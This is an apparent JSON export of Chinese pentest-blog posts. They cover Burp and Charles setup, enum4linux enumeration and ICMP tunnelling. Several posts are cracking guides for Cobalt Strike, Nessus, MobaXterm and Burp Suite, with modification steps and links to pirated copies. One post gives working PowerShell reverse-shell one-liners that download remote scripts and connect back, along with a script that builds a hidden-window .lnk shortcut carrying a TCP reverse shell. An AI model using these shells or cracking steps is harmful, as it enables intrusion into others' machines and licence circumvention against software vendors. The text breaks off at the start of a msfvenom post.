&#x27;7.0.3&#x27;\n\n\n\n接着在设置中设置根据 Form 界面自动生成 Java 源码：\nIDEA &#x3D;&gt; Preference &#x3D;&gt; GUI Designer 选择Java source code\n然后在Gradle的编译选项中设置编译器是IDEA自带的编译器，这样才能自动更新form文件中的控件到代码中：\n新建一个名为ui的包\n参考从头开发一个BurpSuite数据收集插件\nhttps://mp.weixin.qq.com/s/ikmcnAdCLD8eIZgLQnpBzQ\nhttps://mp.weixin.qq.com/s/nltEP0UJt0IGvBOf6LnsNg\nhttps://mp.weixin.qq.com/s/V1t5wNqwqMF_RS6WLB8KLQ\nhttps://blog.yeswehack.com/yeswerhackers/tutorial/how-to-learn-write-burp-suite-extension-kotlin-setting-up/\n","categories":["神兵利器"],"tags":["Burpsuite"]},{"title":"Charles External Proxy To Burp","url":"/2021/12/charles-external-proxy-to-burp/","content":"Browser-&gt; Charles -&gt; Burp将Charles&#x2F;Proxyman等作为中间代理，把抓取的数据包传递给burpsuite。\n首先\n\nCharles监听：127.0.0.1:8888\n\nBurpSuite监听：127.0.0.1:8080\n\n\n1、设置浏览器（或者APP）代理端口为Charles\n2、Charles开启代理转发到Burp上\nProxy—-External Proxy Settings，都配置上Burp的本地监听端口。\nWeb Proxy和Secure Web Proxy都配置为127.0.0.1:8080\n","categories":["神兵利器"],"tags":["BurpSuite","Charles"]},{"title":"CobaltStrike3.14破解","url":"/2019/06/cobaltstrike3-14%E7%A0%B4%E8%A7%A3/","content":"更新8月6日已更新之前发的是5月2号破解的，并且官方作者的exit暗桩没有去掉。看到很多人用此版本遇到问题，抽空修复了下bug。此版本更新为5月4号版，去除校验问题以及exit暗桩。请使用之前版本的小伙伴记得更新。\n前言原文发布在：https://bithack.io/forum/310\n最近有小伙伴问我要cobalt strike 3.14的版本，之前国际友人给了我3.14的Trial版但是一直没破解，正好破解了分享给大家。关于破解方法网上有很多不再多说，这里仅指出需要修改的文件。\n关键文件\n\n去除试用限制：common&#x2F;License.class\n去除端口限制：aggressor&#x2F;dialogs&#x2F;ListenerDialog.class\n程序逻辑：common&#x2F;Authorization.class、dns&#x2F;QuickSecurity.class\nXor编码逻辑：common&#x2F;ArtifactUtils.class、encoders&#x2F;XorEncoder.class\n添加Xor.bin：resources&#x2F;xor.bin、resources&#x2F;xor64.bin\n\n后门指纹：\n\nserver&#x2F;ProfileEdits.class\nCommon&#x2F;BaseArtifactUtils.class\nCommon&#x2F;ListenerConfig.class\nresource&#x2F;template.x64.ps1、resource&#x2F;template.x86.ps1去除空格后门：common&#x2F;WebTransforms.class\n\n关于这个空格后门，本来是无意间想到然后瞅了一眼，发现3.14版本的竟然还有，官方不是说3.13版本就修复了么。\n3.14版本空格后门存在的位置：\n百度云：https://pan.baidu.com/s/1fKHNJm0mVtfvY0GWqZnk8g  提取码: 6enxCoding：https://git.coding.net/ssooking/cobaltstrike-cracked.git\n注：此版本为官方5月2号的版本，有小伙伴已经放了5月4号的版本。\n","categories":["神兵利器"],"tags":["CobaltStrike","软件破解"]},{"title":"Enum4linux","url":"/2017/08/enum4linux/","content":"简介Enum4linux是一个用于枚举Windows和Linux系统上SMB共享的工具，是Windows上 enum.exe的替代方法。它可以枚举Windows Samba主机快速从目标SMB提取信息。如果目标端口139和445开启，说明SMB服务正常运行。\nLinux安装命令\napt-get install samba\n\n\n\n主要功能：\n\nRID循环（在Windows 2000上将RestrictAnonymous设置为1时）\n用户列表（在Windows 2000上将RestrictAnonymous设置为0时）\n组成员信息列表\n股份列举\n检测主机是在工作组中还是在域中\n识别远程操作系统\n密码策略检索（使用polenum）\n\n\n\n\nenum4linux -v target-ip\n详细模式，显示enum4linux正在执行的基本命令\n\n\n\nenum4linux -a target-ip\n运行所有选项，除了基于字典的共享名猜测之外，\n\n\nenum4linux -U target-ip\n列出用户名（如果服务器允许）-（RestrictAnonymous &#x3D; 0）\n\n\nenum4linux -u administrator -p password -U target-ip\n如果您设法获得了凭据，则可以提取完整的用户列表，而不管RestrictAnonymous选项如何。\n\n\nenum4linux -r target-ip\n从默认RID范围（500-550,1000-1050）中提取用户名\n\n\nenum4linux -R 600-660 target-ip\n使用自定义RID范围提取用户名\n\n\nenum4linux -G target-ip\n列出组。如果服务器允许，您还可以指定用户名-u和密码-p\n\n\nenum4linux -S target-ip\n列出Windows共享，同样可以指定用户名-u和密码-p\n\n\nenum4linux -s shares.txt target-ip\n如果服务器不允许您检索共享列表，请执行字典攻击\n\n\nenum4linux -o target-ip\n使用smbclient获取操作系统信息，这可以在某些Windows版本上获取Service Pack版本\n\n\nenum4linux -i target-ip\n拉取有关拆卸设备已知打印机的信息。\n\n\nReferencehttps://highon.coffee/blog/enum4linux-cheat-sheet/\nhttps://tools.kali.org/information-gathering/enum4linux\nhttps://null-byte.wonderhowto.com/how-to/enumerate-smb-with-enum4linux-smbclient-0198049/\n","categories":["神兵利器"],"tags":["smb"]},{"title":"Get Shell By PowerShell","url":"/2017/08/get-shell-by-powershell/","content":"Invoke-PowerShellTcp.ps1监听：nc -nv -l -p 9999\n目标执行：\npowershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress 监听主机ip -Port 监听端口&quot;\n\nunicorn.pypython unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443\n\n\n\npowercat.ps1监听：nc -nv -l -p 9999\n目标执行：\npowershell -nop -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;);powercat -c 监听主机ip  -p 9999 -e cmd.exe&quot;\n\n\n\n\nLnk Powershell生成快捷方式shell的Powershell脚本\n$WshShell = New-Object -comObject WScript.Shell$Shortcut = $WshShell.CreateShortcut(&quot;c:\\lnk_tests\\payload.lnk&quot;)$Shortcut.TargetPath = &quot;%SystemRoot%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe&quot;$Shortcut.IconLocation = &quot;%SystemRoot%\\System32\\Shell32.dll,21&quot;$Shortcut.Arguments = &#x27;-windowstyle hidden /c $client = New-Object System.Net.Sockets.TCPClient(&quot;&quot;&quot;192.168.1.10&quot;&quot;&quot;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &quot;&quot;&quot;PS &quot;&quot;&quot; + (pwd).Path + &quot;&quot;&quot;&gt; &quot;&quot;&quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&#x27;$Shortcut.Save()\n","categories":["攻防渗透"],"tags":["powershell","命令执行"]},{"title":"MobaXterm v10.9破解","url":"/2018/09/mobaxterm-v10-9%E7%A0%B4%E8%A7%A3/","content":"破解记录 去官网下载个人版\n\n Exeinfo查壳发现无壳\n\n载入OD，右键，字符串智能搜索。\n\n Ctrl+F搜索关键词About，找到到FormAbout处，即关于窗体的创建和显示的位置。双击查看汇编代码\n \n 程序在窗体创建前，先读取和判断自身是否已注册为专业版。往上看，发现有个跳转，这个跳转跳过了一个清零赋值操作。这个清零赋值是最为关键的赋值，如果这个变量被赋值0，就会成为个人免费版。想要专业版的话，这个变量必须为1。我们可以直接把这个清零的操作改为赋值1。而且这个变量的清零不止一处。我们可以尝试搜索一下这行代码。一共有14处。\nmov dword ptr ds:[eax+0xC9C],edx\n\n\n我们依次对每处代码进行修改，选中这句：\nxor edx,edx\n\n把此处汇编代码修改为\nmov byte ptr ds:[eax+0xC9C],1\n\n \n修改完毕后是这样。\n\n将一共14处这样的位置修改完毕后，保存修改的文件\n\n\n\n 执行的时候可能会弹出一个框，提示不是正版，不过只会出现一次，不影响后面使用。\n\n破解完毕。\n\n附v11.0破解版：\n链接: https://pan.baidu.com/s/1thfncXI-AaMfB_Dex2iNeQ\n提取码: xqpv \n参考https://www.52pojie.cn/thread-704974-1-1.html\n","categories":["神兵利器"],"tags":["软件破解","MobaXterm"]},{"title":"Nessus8.x破解","url":"/2020/05/nessus8-x%E7%A0%B4%E8%A7%A3/","content":"1.安装nessus软件包官网nessus软件包下载地址：https://www.tenable.com/downloads/nessus\n安装nessus，后文以默认安装路径为例。\n安装完nessus后，会自动打开浏览器访问https://localhost:8834。\nlinux安装完需要先执行systemctl start nessusd.service启动nessus服务。\n进入配置页面，选择Connect Via SSL→Managed Scanner→Managed by Tenable.sc，点击 Continue，设置本地Nessus管理账号。\n点击提交后会自动初始化，完成后会进入到nessus关于页面，可以看到一些nessus信息。\nNessus (Unregistered Scanner)\t\tVersion8.13.1 (#257) WINDOWSPlugins\t\tLast Updated\tN/A\t\tLicense Expiration\tN/A\t\tPlugin Set\tN/A\t\tPolicy Template Version\t202012031832\t\tActivation CodeN/A\n\n\n\n2.使用离线包安装更新访问 \nhttps://plugins.nessus.org/offline.php\nhttps://plugins.nessus.org/v2/offline.php\n第一个框中的Challenge code在本地生成：\n# Windows&quot;C:\\Program Files\\Tenable\\Nessus\\nessuscli.exe&quot; fetch --challenge# Linuxsudo /opt/nessus/sbin/nessuscli fetch --challenge# macOS/Library/Nessus/run/sbin/nessuscli fetch --challeng\n\n\n\n第二个框需要填入注册生成的Activation code。注册地址：https://zh-cn.tenable.com/products/nessus/nessus-essentials。可以使用临时邮箱接收邮件：https://temp-mail.org/zh/。\n信息随便写，点击注册后邮箱收到邮件，把邮件中的激活码贴到第二个框里，提交。此时可以下载两个文件all-2.0.tar.gz 和 nessus-fetch.rc，压缩包的东西就是扫描器插件包。\n1、复制nessus-fetch.rc文件到下表所示指定位置\n\n\n\nSystem\nPath\n\n\n\nUnix\n&#x2F;opt&#x2F;nessus&#x2F;etc&#x2F;nessus&#x2F;\n\n\nWindows Vista&#x2F;7&#x2F;8&#x2F;2008&#x2F;2012\nC:\\ProgramData\\Tenable\\Nessus\\conf\\\n\n\nWindows XP&#x2F;2K3\nC:\\Documents and Settings\\All Users\\Application Data\\Tenable\\Nessus\\conf\\\n\n\nMacOS\n&#x2F;Library&#x2F;Nessus&#x2F;run&#x2F;etc&#x2F;nessus&#x2F;\n\n\nFreeBSD\n&#x2F;usr&#x2F;local&#x2F;nessus&#x2F;etc&#x2F;nessus&#x2F;nessus-fetch.rc\n\n\n2、离线更新插件：\n把all-2.0.tar.gz复制到nessuscli.exe目录下，以管理员权限运行命令：\n# Windowsnessuscli.exe update all-2.0.tar.gz    #此时会生成一串数字&quot;C:\\Program Files\\Tenable\\Nessus\\nessuscli.exe&quot; update C:\\all-2.0.tar.gz# Linux/MacOSsudo ./nessuscli update ~/Downloads/all-2.0.tar.gz\n\n保存结果中的数字串如：202101042100，后面破解会用到\n命令执行完毕后，压缩备份plugins插件目录C:\\ProgramData\\Tenable\\Nessus\\nessus\\plugins\\（其他路径见下文）备用。\n3.破解IP限制创建一个文件plugin_feed_info.inc内容如下，其中PLUGIN_SET为插件的更新时间，根据实际插件日期调整。\nPLUGIN_SET = &quot;202101042100&quot;;PLUGIN_FEED = &quot;ProfessionalFeed (Direct)&quot;;PLUGIN_FEED_TRANSPORT = &quot;Tenable Network Security Lightning&quot;;\n\n将 plugin_feed_info.inc 文件替换到指定路径\n# WindowsC:\\ProgramData\\Tenable\\Nessus\\nessus\\C:\\ProgramData\\Tenable\\Nessus\\nessus\\plugins\\# MacOS/Library/Nessus/run/var/nessus//Library/Nessus/run/lib/nessus/plugins/# Linux/opt/nessus/lib/nessus/plugins//opt/nessus/var/nessus/\n\n注：PLUGIN_SET里面要对应你自己的版本号\nWindows权限中设置plugin_feed_info.inc拒绝写入\nLinux下可以使用脚本自动生成plugin_feed_info.inc文件：\nexport PLUGIN_SET=&quot;202101042100&quot;cat&gt;/opt/nessus/lib/nessus/plugins/plugin_feed_info.inc&lt;&lt;EOFPLUGIN_SET = $&#123;PLUGIN_SET&#125;;PLUGIN_FEED = &quot;ProfessionalFeed (Direct)&quot;;PLUGIN_FEED_TRANSPORT = &quot;Tenable Network Security Lightning&quot;;EOFcat&gt;/opt/nessus/var/nessus/plugin_feed_info.inc&lt;&lt;EOFPLUGIN_SET = $&#123;PLUGIN_SET&#125;;PLUGIN_FEED = &quot;ProfessionalFeed (Direct)&quot;;PLUGIN_FEED_TRANSPORT = &quot;Tenable Network Security Lightning&quot;;EOF\n\n\n\n使用chattr命令添加隐藏属性禁止任何人修改，防止文件在更新时重新变回去。\nsudo chattr +i /opt/nessus/var/nessus/plugin_feed_info.inc sudo chattr +i /opt/nessus/lib/nessus/plugins/plugin_feed_info.incsudo chattr -R +i /opt/nessus/lib/nessus/plugins/ \n\n\n\n4.重启Nessus服务破解完毕后重启nessus服务\n\nLinux：service nessusd restart\nWindows：系统在任务管理器的服务中重启Tenable Nessus服务\n\n重启nessus服务后，此时plugin_feed_info.inc变成了空文件，且plugins里的规则文件也没了。此时重新替换plugin_feed_info.inc，重启nessus服务，刷新网页看到变成了Unlimited，此时把之前复制的plugins目录再替换一下即可。\n5.禁止Nessus自动更新每次更新完后，plugin_feed_info.inc都会变回家庭版的配置（因为是通过下载家庭版的插件包来进行离线更新的），解决方法是：\n1、禁止自动更新，需要更新时，手动下载插件包更新\n2、每次更新完，用脚本自动把plugin_feed_info.inc文件替换回自定义内容，并且替换plugins目录\n一、禁止自动更新\n在hosts文件中添加代码：\n127.0.0.1 plugins.nessus.org127.0.0.1 www.nessus.org127.0.0.1 www.tenable.com\n\n因为不知道哪一个网站是负责更新的，所以就全部添加了，以防自动更新，可以具体抓包看下。\n二、自动替换plugin_feed_info.inc文件\n执行下面的脚本（修改URL为自己注册获取的，该链接可重复使用下载最新插件包），自动创建一个nessus-update文件，执行.&#x2F;nessus-update自动更新插件。\n#!/bin/bashrm ~/all-2.0.tar.gz 2&amp;&gt;1 &gt;/dev/nullwget -O &quot;all-2.0.tar.gz&quot; &quot;https://plugins.nessus.org/v2/nessus.php?f=all-2.0.tar.gz&amp;u=xxxxx&amp;p=xxxxx&quot; &amp;&amp; /opt/nessus/sbin/nessuscli update all-2.0.tar.gzsed -i &#x27;s/&quot;HomeFeed (Non-commercial use only)&quot;/&quot;ProfessionalFeed (Direct)&quot;/g&#x27; /opt/nessus/var/nessus/plugin_feed_info.incsed -i &#x27;s/&quot;HomeFeed (Non-commercial use only)&quot;/&quot;ProfessionalFeed (Direct)&quot;/g&#x27; /opt/nessus/lib/nessus/plugins/plugin_feed_info.incEOFchmod u+x nessus-update\n\n然后设置定时执行更新脚本：crontab -l  \n进入Crontab编辑器，添加一行内容，如每天凌晨两点执行更新：\n0 2 * * * bash /root/nessus-update\n\n\n\n6.License问题其中由于没有导入license授权文件，所以授权到期时间以及激活码均显示N&#x2F;A。\n如果想显示出来，可以在Web页面”Activation Code”处填入上面获取的激活码，填完之后会自动更新插件并初始化。\n\n注：这里需要注意，每次更新后plugin_feed_info.inc文件都会恢复到家庭版的配置，所以更新完成后需要手动修改plugin_feed_info.inc\n（PLUGIN_FEED &#x3D; “HomeFeed (Non-commercial use only)”）。\n\n另一种离线激活，代替在线注册生成的Activation code的步骤\n然后本地执行命令进行离线激活\nnessuscli fetch --register-offline nessus.license\n\n参考：https://docs.tenable.com/nessus/commandlinereference/Content/RegisterAScannerOffline.htm\n后期维护你需要这样做：\n\n在Windows服务中将Tenable Nessus设置为手动\n每次启动Nessus前，删除nessus&#x2F;plugins目录下plugin_feed_info.inc。\n非常低的几率，你的Nessus&#x2F;plugin_feed_info.inc会被重置，修改成破解版内容即可。\n\n以下为详细：\n由于Nessus服务每次重启后，都会重置plugin_feed_info.inc，这将会使nessus&#x2F;plugins目录下所有的插件都被删除，无法扫描。\n我试着把将Nessus服务设置成手动，这样plugins目录就不会被删除。\n所以，在每次使用之前，建议手动覆盖Nessus目录下plugin_feed_info.inc文件，删除nessus&#x2F;plugins目录下的plugin_feed_info.inc文件，再开启Nessus服务。\nhttps://www.blueprintf.com/thread/4\n&quot;C:\\Program Files\\Tenable\\Nessus\\nessuscli.exe&quot; fetch --challengeChallenge code: d9e7d13547751bf9b67693300c7f8ebfee118e31You can copy the challenge code above and paste it alongside yourActivation Code at:https://plugins.nessus.org/v2/offline.phpYour activation code for Nessus Essentials is:1086-245A-06F4-0BDB-9948202101042100\n\n\n\n\n\nhttps://www.freebuf.com/articles/web/262914.html\n","categories":["神兵利器"],"tags":["软件破解","Nessus"]},{"title":"PentestBox配置","url":"/2020/01/pentestbox%E9%85%8D%E7%BD%AE/","content":"aliases目录由于pentestbox中默认cd命令在windows环境下需要cd后，再手动换盘很麻烦。自定义下cd完成直接跳转盘符。\ncd= cd /d $*\n\n还可以把经常要去的目录写成命令：\netool=cd /d &quot;E:/tools&quot;\n\n设置默认打开目录打开设置，选择Startup-Task，增加窗口任务MyShells::cmd_Bin，把\n# 任务参数/icon &quot;%pentestbox_ROOT%\\PentestBox.exe&quot;cmd /k &quot;%ConEmuDir%\\..\\..\\config\\init.bat&quot;  -cur_console:d:%pentestbox_ROOT%\\bin &#123;MyShells::cmd_Bin&#125;\n\n\n\n设置右键当前目录打开conemu\n打开Settings\n\n选择Intergration选项\n\n先在Startup-Task中添加&#123;MyShells::cmd_Box&#125;，启动命令\ncmd /k &quot;%ConEmuDir%\\..\\..\\config\\init.bat&quot;  -new_console:a\n\n在command:{cmd} -cur_console:n中修改cmd为你喜欢的shell，如&#123;MyShells::cmd_Box&#125; -cur_console:n\n\n点击第一个Register就ok了\n\n\n命令行不显示中文PentestBox使用的是ConEmu命令行。\nConEmu命令行ls无法显示中文，解决：\n\n打开settings面板，找到Startup -&gt; Envrioment选项\n在下面的文本框里添加一行：set LANG&#x3D;zh_CN.UTF-8\n\n命令补全PentestBox使用clink来实现自动补全。默认不启用，需要去setting-Features中启用它。\n下载clink,然后解压到E:\\PentestBox\\vendor\\conemu-maximus5\\ConEmu\\clink路径即可\n共享系统环境变量修改PentestBox\\config\\init.bat配置文件手动添加path\n:: Enhance Path@set git_install_root=%pentestbox_ROOT%\\base\\PortableGit@set powershell_system=C:\\Windows\\System32\\WindowsPowerShell\\v1.0@set win32_wmic_system=C:\\Windows\\System32\\wbem@set PATH=C:\\Windows;C:\\Windows\\System32;C:\\Windows\\SysWOW64;%win32_wmic_system%;%win32_wmic_system%WMIC.exe;%powershell_system%;%pentestbox_ROOT%\\bin;%pentestbox_ROOT%\\bin\\ScriptTools;%git_install_root%\\bin;%git_install_root%\\mingw32\\bin;%git_install_root%\\usr\\bin;.......\n\n\n\n\n","categories":["神兵利器"],"tags":["PentestBox"]},{"title":"icmp tunnel","url":"/2021/11/icmp-tunnel/","content":"启动 proxyman 提示升级 HelperTool，但是报如下错误：\nCFErrorDomainLaunchd Code=9\n\n错误处理办法\n# 查看被禁用信息$ launchctl print-disabled system...&quot;com.proxyman.NSProxy.HelperTool&quot; =&gt; true...# 解禁软件$ sudo launchctl enable system/com.proxyman.NSProxy.HelperTool\n\n\n\ndocker类似问题\nsudo launchctl enable system/com.docker.vmnetdsudo rm -f /Library/LaunchDaemons/com.docker.vmnetd.plistsudo rm -f /Library/PrivilegedHelperTools/com.docker.vmnetd\n\n","categories":["神兵利器"],"tags":["Proxyman"]},{"title":"cobaltstrike3.12-3.13破解","url":"/2018/10/cobaltstrike3-12-3-13%E7%A0%B4%E8%A7%A3/","content":"更新3.13破解版链接: https://pan.baidu.com/s/14e0tpVPzUhiAhYU2_jvBag 提取码: d9uf\nMacOS客户端：\n链接: https://pan.baidu.com/s/1h8KwLQ58I-P58tdbz7z3QA 提取码: 8sae\n\n一.CobaltStrike3.12下载校验：https://verify.cobaltstrike.com/\nxor.bin：https://github.com/verctor/CS_xor64\ngithub上因为DMCA不能上传了，这里给个网盘链接：\n链接：https://pan.baidu.com/s/1n6h2w5j0TCx9GnnC5Z7gZg\n提取码：1sxu \n注意：\n一开始放的版本CSDN破解时没注意，EICAR指纹没有清除干净，主要存在于这三个文件：\ncommon.ListenerConfigresources/template.x64.ps1、resources/template.x86.ps1\n\n网盘链接是已经更新的，可以替换cobaltstrike.jar文件。或者自行对此三个文件进行反编译修改。\n附一些教程\n官方教程中文字幕\nYouTube 英文教程\n链接：https://pan.baidu.com/s/1_ClGEELSHzXNC6PAEVcUVA \n提取码：iunr \n二.破解记录关键文件位置aggressor/dialogs/ListenerDialog.classcommon/ArtifactUtils.classcommon/License.classserver/ProfileEdits.classresources/xor.binresources/xor64.bincommon.ListenerConfigresources/template.x64.ps1、resources/template.x86.ps1\n\nLicense两种破解思路\n（1）直接改试用时间\nprivate static long life = 99999L;\n\n（2）修改isTrail的判断逻辑\n把这里的true改为false\npublic static boolean isTrial()  &#123;    return true;  &#125;\n\n把这两个函数中的内容删掉，启动时可以不显示试用信息\npublic static void checkLicenseGUI(Authorization auth)public static void checkLicenseConsole(Authorization auth)\n\n去除listener个数限制去掉这段，去除只能添加一个listener的限制\nelse if ((Listener.isEgressBeacon(payload)) &amp;&amp; (DataUtils.isBeaconDefined(this.datal)) &amp;&amp; (!name.equals(DataUtils.getEgressBeaconListener(this.datal))))   &#123;     DialogUtils.showError(&quot;You may only define one egress Beacon per team server.\\nThere are a few things I need to sort before you can\\nput multiple Beacon HTTP/DNS listeners on one server.\\nSpin up a new team server and add your listener there.&quot;);   &#125;\n\n后门特征指纹存在后门特征指纹的几个地方\ncommon&#x2F;ArtifactUtils.class\npacker.addString(&quot;X5O!P%@AP[4\\\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&quot;);\n\nserver&#x2F;ProfileEdits.class\nc2profile.addCommand(&quot;.http-get.server&quot;, &quot;!header&quot;, &quot;X-Malware: X5O!P%@AP[4\\\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&quot;);c2profile.addCommand(&quot;.http-post.server&quot;, &quot;!header&quot;, &quot;X-Malware: X5O!P%@AP[4\\\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&quot;);c2profile.addCommand(&quot;.http-stager.server&quot;, &quot;!header&quot;, &quot;X-Malware: X5O!P%@AP[4\\\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&quot;);c2profile.addCommand(&quot;.stage.transform-x86&quot;, &quot;append&quot;, &quot;X5O!P%@AP[4\\\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&quot;);c2profile.addCommand(&quot;.stage.transform-x64&quot;, &quot;append&quot;, &quot;X5O!P%@AP[4\\\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&quot;);\n\ncommon.ListenerConfig\n-  result.append(&quot;5O!P%@AP[4\\\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\\u0000&quot;);+  result.append(&quot;123\\u0000&quot;);\n\nresources&#x2F;template.x64.ps1、resources&#x2F;template.x86.ps1\n$eicar = &#x27;X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&#x27;+  $eicar = &#x27;&#x27;\n\ncommon.ArtifactUtils\n已经修改了License.isTrial()返回值为false，所以改不改也没什么影响\n清除cobaltstrike缓存rm -rf logs data cobaltstrike.store \n\n\n参考https://xz.aliyun.com/t/2170\nhttps://www.bilibili.com/video/av34171888/\nhttps://github.com/Lz1y/cobalt_strike_3.12_patch\n","categories":["神兵利器"],"tags":["CobaltStrike","软件破解"]},{"title":"cobaltstrike4.0 cracked","url":"/2020/03/cobaltstrike4-0-cracked/","content":"下载地址先放下载链接：\n\n原版： cobaltstrike4.0-original\n破解版：cobaltstrike4.0-cracked\nmacOS客户端：cobaltstrike4.0-macOS app  Gitee: https://gitee.com/ssooking/cobaltstrike-cracked.git  百度云链接： https://pan.baidu.com/s/1Ah-H0Eelvm8PmVZ0_Jvz6w  密码: up2s  Coding：https://e.coding.net/ssooking/cobaltstrike-cracked.git\n\n主要修改的文件：\ncommon/Authorization.classbeacon/BeaconData.classaggressor/dialogs/WindowsExecutableDialog.class\n\n破解版说明：\n\n绕过验证校验\n破解过期问题\n去除exit暗桩\n修复x64上线问题\n\nmacOS可以使用jar2app一键制作app程序\njar2app cobaltstrike.jar -j &quot;-XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M&quot; -i cobaltstrike.icns\n\n-j参数后是cobaltstrike4执行需要的jvm参数\n-i 参数后加icns图标文件，可以使用软件或者在线工具把图片转成icns格式\n破解记录cobaltstrike4.0更新以来，没有像之前一样提前拿到原版，运气用光了+~+，国际友人也没有，一直在等着白嫖版的出现。昨天凌晨2点多CoolCat师傅放出了CobaltStrike4.0的破解版，并随后发布了破解文章Patch Cobalt Strike4.0，不过当时只破解了校验问题(现已更新)，未注意到过期问题和exit暗桩问题。\n后来有小伙伴分享了原版。该原版非官方最新版，而是2019年12月份的有bug版本，官方随后进行了更新。该bug版本主要的影响之一就是生成x64的木马时，无法正常上线。\n\n于是昨晚进行了破解，主要修改了过期问题，和exit暗桩导致的beacon退出问题，过校验那用的还是CoolCat的(懒)。\ncommon.Authorization过期问题关键处：\n1.protected boolean valid = false;    //false改为true2.isValid()\t\t\t\t\t\t\t\t\t\t\t\t\t\t//函数置空3.isExpired()\t\t\t\t\t\t\t\t\t\t\t\t\t//函数置空\n\nbeacon.BeaconDataexit暗桩问题关键处：\npublic void shouldPad(boolean paramBoolean) &#123;    this.shouldPad = paramBoolean;\t\t\t//paramBoolean改为false    this.when = System.currentTimeMillis() + 1800000L;&#125;\n\n改完后愉快地私下分享给了一些小伙伴，今天下午发现官方的bug影响到了x64的上线，手里有项目暂时也没精力去看。此时可爱的小天使snowming出现了，下午她读代码研究了一下，解决了这个问题，文章见其司知识星球链接。该问题的原因是在生成 stage 可执行文件时候，不管是 x64 还是 x86，都直接使用了x86的payload，因此只需要添加一个判断逻辑即可。\n\n修改方法：\npath：aggressor/dialogs/WindowsExecutableDialog.classpublic void dialogAction(ActionEvent paramActionEvent, Map paramMap) &#123;\tthis.options = paramMap;\tString str1 = DialogUtils.string(paramMap, &quot;listener&quot;);\tboolean bool = DialogUtils.bool(this.options, &quot;x64&quot;);\tif (bool) &#123;\t\tthis.stager = ListenerUtils.getListener(this.client, str1).getPayloadStager(&quot;x64&quot;);\t&#125; else &#123;\t\tthis.stager = ListenerUtils.getListener(this.client, str1).getPayloadStager(&quot;x86&quot;);\t&#125; \tif (this.stager.length == 0)\t....\n\n感谢@snowming，最后的版本是她基于我的基础上修改了x64的部分，算是ssooking&amp;snowming破解版吧：）。后来看到CoolCat师傅也发博客分享了解决方法Patch Cobalt Strike 4.0 Stage X64 Bugs，文章的分析思路值得学习。感谢师傅们的付出和完善。同时，此文发出前几分钟，看到了Frost Blue 零队公众号发的另一种破解绕过校验思路，Cobaltstrike 4破解之我自己给我自己颁发license。\n\n彩蛋最后还有一个小彩蛋，在dialog.FontDialog下，有个\n乍一看上去像留了后门，仔细看下代码发现仅仅是个Label,可能是作者的恶作剧吧。不过这也提醒我们，网上的东西使用需谨慎，毕竟在这么大的代码量下是否隐藏了些什么也不得而知。\n","categories":["神兵利器"],"tags":["CobaltStrike","软件破解"]},{"title":"icmp tunnel","url":"/2020/11/icmp-tunnel/","content":"icmp tunnelicmptunnel 是一种在 ICMP 回显请求和响应 (ping) 数据包中隧道传输 IP 流量的工具，可以帮助我们在严格的网络环境下传输payload。\ngit clone https://github.com/jamesbarlow/icmptunnel.gitcd icmptunnelmake\n\n该工具仅适用于Linux，首先需要禁用客户端和服务器上的ICMP响应，防止响应ping数据。\necho 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all\n\n在服务器端，启动icmptunnel服务，并为隧道接口分配一个IP地址。\n# ./icmptunnel –sopened tunnel device: tun0(ctrl-z)# bg# /sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0\n\n在客户端，将 icmptunnel 指向服务器，并分配一个 IP 地址。\n# ./icmptunnel &lt;server&gt;opened tunnel device: tun0connection established.(ctrl-z)# bg# /sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0\n\n此时，拥有了一个通过 ICMP数据包传输的点对点隧道。服务器端是10.0.0.1，客户端是10.0.0.2。在客户端，尝试通过 SSH 连接到服务器：\nssh root@10.0.0.1\n\n\n\n将远程服务器用作SOCKS代理：\nssh -D 8080 -N root@10.0.0.1\n\n然后将本地浏览器的代理设置为8080端口\n限制在 Linux和Windows 上，用户模式程序需要提升权限才能与原始套接字交互，需要在隧道两端的主机均拥有root 或本地管理员权限。\n参考https://labs.f-secure.com/tools/pivot-with-ping/\n","categories":["神兵利器"],"tags":["tunnel"]},{"title":"macOS启动破解版Burp","url":"/2019/12/macos%E5%90%AF%E5%8A%A8%E7%A0%B4%E8%A7%A3%E7%89%88burp/","content":"macOS启动破解版Burp1、首先正常使用注册机破解启动一次\n2、将burp-loader-x-Ai.jar复制到/Applications/Burp Suite Professional.app/Contents/java/app/\n3、在/Applications/Burp Suite Professional.app/Contents/vmoptions.txt末尾添加内容：\n-noverify-javaagent:burp-loader-x-Ai.jar\n\n","categories":["神兵利器"],"tags":["Burpsuite"]},{"title":"msfvenom生成payload","url":"/2016/11/msfvenom%E7%94%9F%E6%88%90payload/","content":"msfvenom重要参数查看payloads: msfvenom -l payloads      